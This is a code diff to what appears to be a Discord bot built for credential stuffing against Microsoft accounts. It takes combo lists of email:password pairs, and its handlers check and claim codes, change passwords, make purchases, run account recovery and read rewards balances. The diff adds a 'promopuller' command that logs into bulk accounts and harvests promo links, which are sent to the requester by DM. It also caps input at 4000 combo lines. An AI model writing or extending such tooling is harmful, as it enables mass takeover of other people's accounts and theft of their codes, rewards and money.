@@ -12,7 +12,7 @@ const { StatsManager } = require("./utils/stats-manager");
 const { sendToWebhook } = require("./utils/webhook");
 const { checkCodes } = require("./utils/microsoft-checker");
 const { claimWlids } = require("./utils/microsoft-claimer");
-const { pullCodes } = require("./utils/microsoft-puller");
+const { pullCodes, pullLinks } = require("./utils/microsoft-puller");
 const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
 const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
 const { initiateRecovery, submitCaptchaAndContinue, submitNewPassword, downloadCaptchaImage } = require("./utils/microsoft-recover");
@@ -26,6 +26,8 @@ const {
   pullFetchProgressEmbed,
   pullLiveProgressEmbed,
   pullResultsEmbed,
+  promoPullerFetchProgressEmbed,
+  promoPullerResultsEmbed,
   purchaseResultsEmbed,
   purchaseProgressEmbed,
   productSearchEmbed,
@@ -105,6 +107,8 @@ async function sendWelcomeIfNeeded(respond, userId, username) {
   } catch {}
 }
 
+const MAX_COMBO_LINES = 4000;
+
 function splitInput(raw) {
   if (!raw) return [];
   return raw
@@ -177,6 +181,7 @@ async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threa
 
     if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided and none stored.\nUse `/wlidset` or `.wlidset` to set WLIDs first, or provide them directly.")] });
     if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided. Use the `codes` option or attach a `.txt` file.")] });
+    if (codes.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many codes. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, codes.length, `Checking codes (${wlids.length} WLIDs)`)],
@@ -254,6 +259,7 @@ async function handleClaim(respond, userId, accountsRaw, accountsFile, threads =
     }
 
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Claiming WLIDs")],
@@ -326,6 +332,7 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
     }
 
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0, working: 0, failed: 0, withCodes: 0, noCodes: 0, startTime, username })],
@@ -445,7 +452,128 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
   }
 }
 
-// ── Auth handler ─────────────────────────────────────────────
+// ── PromoPuller handler ──────────────────────────────────────
+
+async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmUser = null, username = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  const acquire = limiter.acquire(userId, "promopuller");
+  if (!acquire.ok) {
+    const reason = acquire.reason === "busy"
+      ? "You already have a command running. Wait for it to finish."
+      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
+    return respond({ embeds: [errorEmbed(reason)] });
+  }
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+  const startTime = Date.now();
+
+  try {
+    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
+    if (accountsFile) {
+      const lines = await fetchAttachmentLines(accountsFile);
+      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
+    }
+
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+
+    const msg = await respond({
+      embeds: [promoPullerFetchProgressEmbed({ done: 0, total: accounts.length, totalLinks: 0, working: 0, failed: 0, withLinks: 0, noLinks: 0, startTime, username })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    let totalLinksSoFar = 0;
+    let lastAccount = "";
+    let lastLinks = 0;
+    let lastError = null;
+    let fetchWorking = 0;
+    let fetchFailed = 0;
+    let fetchWithLinks = 0;
+    let fetchNoLinks = 0;
+
+    const { fetchResults, allLinks } = await pullLinks(accounts, (phase, detail) => {
+      const now = Date.now();
+
+      if (phase === "fetch") {
+        totalLinksSoFar += detail.links;
+        lastAccount = detail.email;
+        lastLinks = detail.links;
+        lastError = detail.error;
+
+        if (detail.error) {
+          fetchFailed++;
+        } else {
+          fetchWorking++;
+          if (detail.links > 0) fetchWithLinks++;
+          else fetchNoLinks++;
+        }
+
+        if (now - lastUpdate > 2000) {
+          lastUpdate = now;
+          updateProgress(msg, promoPullerFetchProgressEmbed({
+            done: detail.done,
+            total: detail.total,
+            totalLinks: totalLinksSoFar,
+            working: fetchWorking,
+            failed: fetchFailed,
+            withLinks: fetchWithLinks,
+            noLinks: fetchNoLinks,
+            lastAccount,
+            lastLinks,
+            lastError,
+            startTime,
+            username,
+          }), userId);
+        }
+      }
+    }, ac.signal);
+
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+    const stopped = ac.signal.aborted;
+    const files = [];
+    const uniqueLinks = [...new Set(allLinks)];
+
+    if (allLinks.length > 0)
+      files.push(textAttachment(allLinks, "links_all.txt"));
+    if (uniqueLinks.length > 0 && uniqueLinks.length !== allLinks.length)
+      files.push(textAttachment(uniqueLinks, "links_unique.txt"));
+
+    // Per-account breakdown
+    const perAccount = fetchResults
+      .filter((r) => !r.error && r.links.length > 0)
+      .map((r) => `${r.email}\n${r.links.join("\n")}`);
+    if (perAccount.length > 0)
+      files.push(textAttachment(perAccount, "links_by_account.txt"));
+
+    const embed = promoPullerResultsEmbed(fetchResults, allLinks, {
+      elapsed,
+      dmSent: !!dmUser,
+      username: username || undefined,
+    });
+    if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files });
+        await msg.edit({ embeds: [promoPullerResultsEmbed(fetchResults, allLinks, { elapsed, dmSent: true, username: username || undefined })], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files, components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files, components: [] });
+    }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
 
 async function handleAuth(respond, callerId, targetId, durationStr) {
   if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can authorize users.")] });
@@ -558,6 +686,7 @@ async function handlePurchase(respond, userId, accountsRaw, accountsFile, produc
     }
 
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
     if (!productUrl) return respond({ embeds: [errorEmbed("No product URL or ID provided.")] });
 
     // Extract product ID from URL or use directly
@@ -688,6 +817,7 @@ async function handleChanger(respond, userId, accountsRaw, accountsFile, newPass
     }
 
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
     if (!newPassword) return respond({ embeds: [errorEmbed("No new password provided.")] });
     if (newPassword.length < 8) return respond({ embeds: [errorEmbed("New password must be at least 8 characters.")] });
 
@@ -774,7 +904,8 @@ async function handleAccountChecker(respond, userId, accountsRaw, accountsFile, 
       accounts = accounts.concat(lines.filter((l) => l.includes(":")));
     }
 
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).") ] });
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Checking accounts")],
@@ -908,6 +1039,9 @@ async function handleRecover(respond, userId, emailsRaw, emailsFile, newPassword
 
   if (emails.length === 0) {
     return respond({ embeds: [errorEmbed("No emails provided. Provide email(s) or attach a `.txt` file.")] });
+  }
+  if (emails.length > MAX_COMBO_LINES) {
+    return respond({ embeds: [errorEmbed(`Too many emails. Max ${MAX_COMBO_LINES} lines allowed.`)] });
   }
 
   // Single email — original interactive flow (supports CAPTCHA)
@@ -1068,6 +1202,7 @@ async function handleRewards(respond, userId, accountsRaw, accountsFile, threads
     }
 
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Checking Rewards Balances")],
@@ -1189,6 +1324,13 @@ client.on("interactionCreate", async (interaction) => {
       const accounts = interaction.options.getString("accounts");
       const accountsFile = interaction.options.getAttachment("accounts_file");
       await handlePull(respond, user.id, accounts, accountsFile, user, user.username);
+    }
+
+    else if (commandName === "promopuller") {
+      await interaction.deferReply();
+      const accounts = interaction.options.getString("accounts");
+      const accountsFile = interaction.options.getAttachment("accounts_file");
+      await handlePromoPuller(respond, user.id, accounts, accountsFile, user, user.username);
     }
 
     else if (commandName === "wlidset") {
@@ -1354,6 +1496,15 @@ client.on("messageCreate", async (message) => {
         return respond({ embeds: [infoEmbed("Usage", "`.pull <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nResults are always sent to your DMs.")] });
       }
       await handlePull(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
+    }
+
+    else if (cmd === "promopuller") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) {
+        return respond({ embeds: [infoEmbed("Usage", "`.promopuller <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nPulls promo links only. Results sent to your DMs.")] });
+      }
+      await handlePromoPuller(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
     }
 
     else if (cmd === "wlidset") {
